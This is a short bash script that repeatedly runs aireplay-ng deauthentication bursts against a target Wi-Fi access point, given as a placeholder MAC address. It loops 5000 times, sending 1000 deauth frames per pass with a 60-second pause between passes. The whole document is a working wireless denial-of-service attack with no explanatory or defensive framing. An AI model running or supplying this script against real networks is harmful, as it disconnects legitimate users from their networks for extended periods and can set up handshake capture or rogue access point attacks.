#!/bin/bash

for i in {1..5000}
do

	aireplay-ng -deauth 1000 -a <target Mac Address>  wlan0mon

	sleep 60s
done
